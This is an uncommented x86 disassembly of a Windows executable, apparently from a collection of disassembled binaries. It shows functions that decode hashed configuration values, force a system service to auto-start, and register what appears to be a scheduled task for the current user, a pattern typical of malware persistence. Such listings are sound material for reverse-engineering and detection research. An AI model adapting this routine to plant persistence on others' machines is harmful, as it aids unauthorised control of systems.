mov [ ebp - 0x49c ] 0xc422369
push 0x1
lea eax [ ebp - 0x464 ]
push eax
lea eax [ ebp - 0x49c ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_416b05
push [ ebp - 0x464 ]
lea eax [ ebp - 0x254 ]
push eax
call [ lstrcatW@IAT ]
and [ ebp - 0x48 ] 0x0
mov [ ebp - 0x4a0 ] 0xf22f2ed
push 0x1
lea eax [ ebp - 0x464 ]
push eax
lea eax [ ebp - 0x4a0 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_416b05
mov [ ebp - 0x4a4 ] 0x11d0f59c
push 0x1
lea eax [ ebp - 0x45c ]
push eax
lea eax [ ebp - 0x4a4 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_416b65
mov [ ebp - 0x4a8 ] 0x124a76f5
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4a8 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_416b05
mov [ ebp - 0x4ac ] 0x15289533
push 0x1
lea eax [ ebp - 0x458 ]
push eax
lea eax [ ebp - 0x4ac ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_416b05
mov [ ebp - 0x4b0 ] 0x62358130
push 0x1
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4b0 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_416b05
mov [ ebp - 0x4b4 ] 0x7f4becad
push 0x1
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x4b4 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_416b65
mov [ ebp - 0x4b8 ] 0x69b8e0a0
push 0x1
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x4b8 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_416b65
mov [ ebp - 0x491 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x30 ]
call sub_416bd2
mov al [ ebp - 0x491 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ rw-data ] 0x0
je r-xdata
movzx eax [ ebp - 0x51 ]
test eax eax
jne r-xdata
mov [ ebp - 0x51 ] 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
inc eax
je r-xdata
xor eax eax
inc eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
jmp r-xdata
movzx eax [ ebp - 0x51 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x48 ]
inc eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x50 ]
jle r-xdata
mov eax [ ebp - 0x40 ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
movzx eax [ ebp - 0x51 ]
test eax eax
jne r-xdata
push [ ebp - 0x44 ]
push [ ebp - 0x458 ]
push [ ebp - 0x10 ]
push [ ebp - 0x45c ]
push [ ebp - 0x464 ]
lea eax [ ebp - 0x254 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40dbfc
add esp 0x20
movzx eax al
test eax eax
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
sub_40e20f
push ebp
mov ebp esp
sub esp 0x24
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x24 ] 0x0
push 0x1
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
push 0x14
push r--data
push [ ebp - 0x20 ]
call [ OpenServiceW@IAT ]
mov [ ebp - 0x24 ] eax
push [ ebp - 0x20 ]
call [ CloseServiceHandle@IAT ]
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x24 ]
call [ QueryServiceStatus@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
leave
retn
cmp [ ebp - 0x18 ] 0x4
jne r-xdata
push [ ebp - 0x24 ]
call [ CloseServiceHandle@IAT ]
xor eax eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
push 0x2
push 0xffffffff
push [ ebp - 0x24 ]
call [ ChangeServiceConfigW@IAT ]
push 0x0
push 0x0
push [ ebp - 0x24 ]
call [ StartServiceW@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x24 ]
call [ CloseServiceHandle@IAT ]
xor eax eax
inc eax
jmp r-xdata
push [ ebp - 0x24 ]
call [ CloseServiceHandle@IAT ]
xor eax eax
inc eax
push [ ebp - 0x24 ]
call [ CloseServiceHandle@IAT ]
xor eax eax
jmp r-xdata
sub_40e2da
push ebp
mov ebp esp
sub esp 0x858
lea eax [ ebp - 0x18 ]
push eax
push rw-data
push 0x1
push 0x0
push rw-data
call [ CoCreateInstance@IAT ]
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
jge r-xdata
lea eax [ ebp - 0x14 ]
push eax
push rw-data
push r--data
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push [ ebp - 0x18 ]
call [ eax + 0x18 ]
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
jge r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x10 ] 0x28
jge r-xdata
lea eax [ ebp - 0x14 ]
push eax
push rw-data
push rw-data
push r--data
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push [ ebp - 0x18 ]
call [ eax + 0x20 ]
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
jge r-xdata
leave
retn
push 0x0
push r--data
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x78 ]
mov [ ebp - 0x50 ] eax
push 0x2000
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x70 ]
mov [ ebp - 0x58 ] 0x400
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x858 ]
push eax
call [ GetUserNameW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push [ ebp - 0x18 ]
call [ eax + 0x8 ]
xor al al
jmp r-xdata
push 0x1
push r--data
mov ecx [ ebp + 0x8 ]
call sub_415c32
push eax
xor edx edx
mov ecx [ ebp + 0x8 ]
call sub_4120dc
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x8 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push [ ebp - 0x18 ]
call [ eax + 0x8 ]
xor al al
jmp r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x858 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x78 ]
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x80 ]
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
jge r-xdata
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_415c32
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_413434
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0x50 ] 0x0
jge r-xdata
push 0x4
lea edx [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
call sub_413c8f
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x88 ]
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
jge r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x8 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push [ ebp - 0x18 ]
call [ eax + 0x8 ]
xor al al
jmp r-xdata
xor al al
jmp r-xdata
push r--data
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x90 ]
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
jge r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x8 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push [ ebp - 0x18 ]
call [ eax + 0x8 ]
xor al al
jmp r-xdata
push 0xffffffff
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0xa8 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] 0x20
push [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x98 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0xc ]
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
jge r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x8 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push [ ebp - 0x18 ]
call [ eax + 0x8 ]
xor al al
jmp r-xdata
push 0x30
push 0x0
lea eax [ ebp - 0x48 ]
push eax
call sub_4031e0
add esp 0xc
mov [ ebp - 0x3e ] 0x80c
mov [ ebp - 0x3c ] 0x1
mov [ ebp - 0x3a ] 0x1
mov [ ebp - 0x36 ] 0x2d
mov [ ebp - 0x34 ] 0xa
mov [ ebp - 0x30 ] 0x1
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x42 ] 0x1
mov [ ebp - 0x44 ] 0x7d0
mov [ ebp - 0x48 ] 0x30
xor eax eax
cmp [ ebp + 0x10 ] 0x28
setl al
add eax 0x6
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x38 ] 0x13
mov [ ebp - 0x24 ] 0x1
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x54 ]
mov eax [ eax ]
push [ ebp - 0x54 ]
call [ eax + 0xc ]
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
jge r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x8 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push [ ebp - 0x18 ]
call [ eax + 0x8 ]
xor al al
jmp r-xdata
mov eax [ ebp - 0x54 ]
mov eax [ eax ]
push [ ebp - 0x54 ]
call [ eax + 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
push rw-data
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax ]
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
jge r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x8 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push [ ebp - 0x18 ]
call [ eax + 0x8 ]
xor al al
jmp r-xdata
push 0x1
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push [ ebp - 0x8 ]
call [ eax + 0x18 ]
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push [ ebp - 0x8 ]
call [ eax + 0x8 ]
cmp [ ebp + 0x10 ] 0x32
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x8 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push [ ebp - 0x18 ]
call [ eax + 0x8 ]
xor al al
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x8 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push [ ebp - 0x18 ]
call [ eax + 0x8 ]
mov al 0x1
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x30 ]
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
jge r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x8 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push [ ebp - 0x18 ]
call [ eax + 0x8 ]
xor al al
jmp r-xdata
sub_40e6a0
push ebp
mov ebp esp
push 0xffffffff
push sub_42390c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x91c
push esi
push edi
lea eax [ ebp - 0x44 ]
push eax
call [ VariantInit@IAT ]
lea ecx [ ebp - 0xfc ]
call sub_401963
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x24 ]
push eax
push rw-data
push 0x1
push 0x0
push rw-data
call [ CoCreateInstance@IAT ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jge r-xdata
push [ ebp - 0x24 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
sub esp 0x10
lea esi [ ebp - 0x44 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
lea esi [ ebp - 0x44 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
lea esi [ ebp - 0x44 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
lea esi [ ebp - 0x44 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x24 ]
mov eax [ eax ]
push [ ebp - 0x24 ]
call [ eax + 0x28 ]
test eax eax
jge r-xdata
mov [ ebp - 0x911 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x911 ]
jmp r-xdata
lea eax [ ebp - 0x68 ]
push eax
push r--data
mov eax [ ebp - 0x24 ]
mov eax [ eax ]
push [ ebp - 0x24 ]
call [ eax + 0x1c ]
test eax eax
jge r-xdata
mov [ ebp - 0x912 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x912 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
leave
retn
push [ ebp - 0x68 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
lea eax [ ebp - 0x14 ]
push eax
push r--data
mov eax [ ebp - 0x68 ]
mov eax [ eax ]
push [ ebp - 0x68 ]
call [ eax + 0x34 ]
test eax eax
jl r-xdata
mov [ ebp - 0x913 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x913 ]
jmp r-xdata
push 0x1
push r--data
mov ecx [ ebp + 0x8 ]
call sub_415c32
push eax
xor edx edx
mov ecx [ ebp + 0x8 ]
call sub_4120dc
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp - 0x14 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_40e208
pop ecx
pop ecx
movzx eax al
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
mov eax [ eax ]
push [ ebp - 0x24 ]
call [ eax + 0x24 ]
test eax eax
jge r-xdata
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_415c32
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_413434
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push 0x0
push r--data
mov eax [ ebp - 0x68 ]
mov eax [ eax ]
push [ ebp - 0x68 ]
call [ eax + 0x3c ]
test eax eax
jge r-xdata
cmp [ ebp + 0x10 ] 0x32
je r-xdata
push [ ebp - 0x20 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
push [ ebp - 0x20 ]
call [ eax + 0x24 ]
test eax eax
jge r-xdata
mov [ ebp - 0x918 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x918 ]
jmp r-xdata
mov [ ebp - 0x917 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x917 ]
jmp r-xdata
mov [ ebp - 0x916 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x916 ]
jmp r-xdata
mov [ ebp - 0x915 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x915 ]
jmp r-xdata
lea eax [ ebp - 0x100 ]
push eax
sub esp 0x10
lea esi [ ebp - 0x44 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push [ ebp - 0x14 ]
call [ eax + 0x30 ]
test eax eax
jl r-xdata
push [ ebp - 0x70 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
push [ ebp - 0x20 ]
call [ eax + 0x44 ]
test eax eax
jge r-xdata
mov [ ebp - 0x919 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x919 ]
jmp r-xdata
jmp r-xdata
push [ ebp - 0x100 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
mov [ ebp - 0x914 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x914 ]
jmp r-xdata
push [ ebp - 0x64 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
push [ ebp - 0x20 ]
call [ eax + 0x3c ]
test eax eax
jge r-xdata
mov [ ebp - 0x91a ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x91a ]
jmp r-xdata
push [ ebp - 0x30 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
push [ ebp - 0x20 ]
call [ eax + 0x2c ]
test eax eax
jge r-xdata
mov [ ebp - 0x91b ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x91b ]
jmp r-xdata
push [ ebp - 0x28 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
cmp [ ebp + 0x10 ] 0x28
jge r-xdata
mov [ ebp - 0x91c ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x91c ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov eax [ ebp - 0x64 ]
mov eax [ eax ]
push [ ebp - 0x64 ]
call [ eax + 0x30 ]
test eax eax
jge r-xdata
push 0x3
mov eax [ ebp - 0x30 ]
mov eax [ eax ]
push [ ebp - 0x30 ]
call [ eax + 0x38 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jge r-xdata
push [ ebp - 0x10 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
lea eax [ ebp - 0x1c ]
push eax
push rw-data
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
push [ ebp - 0x10 ]
call [ eax ]
test eax eax
jge r-xdata
mov [ ebp - 0x91e ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x91e ]
jmp r-xdata
mov [ ebp - 0x91d ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x91d ]
jmp r-xdata
push [ ebp - 0x1c ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
push [ ebp - 0x1c ]
call [ eax + 0x2c ]
push 0x4
lea edx [ ebp - 0x5c ]
mov ecx [ ebp + 0x8 ]
call sub_413c8f
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
push [ ebp - 0x1c ]
call [ eax + 0x34 ]
cmp [ ebp + 0x10 ] 0x28
jl r-xdata
mov [ ebp - 0x91f ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x91f ]
jmp r-xdata
lea eax [ ebp - 0x60 ]
push eax
push 0x9
mov eax [ ebp - 0x70 ]
mov eax [ eax ]
push [ ebp - 0x70 ]
call [ eax + 0x28 ]
test eax eax
jge r-xdata
lea eax [ ebp - 0x60 ]
push eax
push 0x8
mov eax [ ebp - 0x70 ]
mov eax [ eax ]
push [ ebp - 0x70 ]
call [ eax + 0x28 ]
test eax eax
jge r-xdata
push [ ebp - 0x60 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
and [ ebp - 0x104 ] 0x0
lea eax [ ebp - 0x104 ]
push eax
push rw-data
mov eax [ ebp - 0x60 ]
mov eax [ eax ]
push [ ebp - 0x60 ]
call [ eax ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jge r-xdata
mov [ ebp - 0x921 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x921 ]
jmp r-xdata
push [ ebp - 0x60 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
jmp r-xdata
mov [ ebp - 0x920 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x920 ]
jmp r-xdata
push [ ebp - 0x104 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
mov [ ebp - 0x108 ] 0x400
lea eax [ ebp - 0x108 ]
push eax
lea eax [ ebp - 0x90c ]
push eax
call [ GetUserNameW@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x922 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x922 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x28
jl r-xdata
lea eax [ ebp - 0x90c ]
push eax
mov eax [ ebp - 0x104 ]
mov eax [ eax ]
push [ ebp - 0x104 ]
call [ eax + 0x5c ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jge r-xdata
push 0xffffffff
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
push [ ebp - 0x28 ]
call [ eax + 0x98 ]
push 0x0
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
push [ ebp - 0x28 ]
call [ eax + 0x50 ]
push r--data
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
push [ ebp - 0x28 ]
call [ eax + 0x28 ]
push 0x1f4
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
push [ ebp - 0x28 ]
call [ eax + 0x30 ]
push r--data
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
push [ ebp - 0x28 ]
call [ eax + 0x70 ]
push 0x0
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
push [ ebp - 0x28 ]
call [ eax + 0x48 ]
push 0x0
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
push [ ebp - 0x28 ]
call [ eax + 0x40 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
push [ ebp - 0x28 ]
call [ eax + 0x9c ]
test eax eax
jge r-xdata
push 0x1
mov eax [ ebp - 0x30 ]
mov eax [ eax ]
push [ ebp - 0x30 ]
call [ eax + 0x48 ]
mov [ ebp - 0x923 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x923 ]
jmp r-xdata
push [ ebp - 0x2c ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
push 0x0
mov eax [ ebp - 0x2c ]
mov eax [ eax ]
push [ ebp - 0x2c ]
call [ eax + 0x30 ]
lea eax [ ebp - 0x54 ]
push eax
call [ VariantInit@IAT ]
push 0x8
push 0x0
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call [ VariantChangeType@IAT ]
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x4c ] eax
cmp [ ebp + 0x10 ] 0x28
jge r-xdata
mov [ ebp - 0x924 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x924 ]
jmp r-xdata
lea eax [ ebp - 0x6c ]
push eax
sub esp 0x10
lea esi [ ebp - 0x44 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x5
sub esp 0x10
lea esi [ ebp - 0x44 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
lea esi [ ebp - 0x54 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x6
push [ ebp - 0x20 ]
push r--data
mov eax [ ebp - 0x68 ]
mov eax [ eax ]
push [ ebp - 0x68 ]
call [ eax + 0x44 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x6c ]
push eax
sub esp 0x10
lea esi [ ebp - 0x44 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x3
sub esp 0x10
lea esi [ ebp - 0x44 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
lea esi [ ebp - 0x44 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x6
push [ ebp - 0x20 ]
push r--data
mov eax [ ebp - 0x68 ]
mov eax [ eax ]
push [ ebp - 0x68 ]
call [ eax + 0x44 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
push [ ebp - 0x6c ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
cmp [ ebp + 0x10 ] 0x32
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call [ VariantClear@IAT ]
mov [ ebp - 0x925 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x925 ]
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jge r-xdata
lea eax [ ebp - 0x54 ]
push eax
call [ VariantClear@IAT ]
mov [ ebp - 0x927 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x927 ]
lea eax [ ebp - 0x910 ]
push eax
sub esp 0x10
lea esi [ ebp - 0x44 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x6c ]
mov eax [ eax ]
push [ ebp - 0x6c ]
call [ eax + 0x30 ]
test eax eax
jge r-xdata
push [ ebp - 0x910 ]
lea ecx [ ebp - 0xfc ]
call sub_4019ba
lea eax [ ebp - 0x54 ]
push eax
call [ VariantClear@IAT ]
mov [ ebp - 0x926 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xfc ]
call sub_401979
mov al [ ebp - 0x926 ]
jmp r-xdata
sub_40ef13
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
call sub_41121b
mov [ ebp - 0x10 ] eax
call sub_40e20f
push 0x0
call [ CoInitialize@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
push 0x0
push 0x0
push 0x0
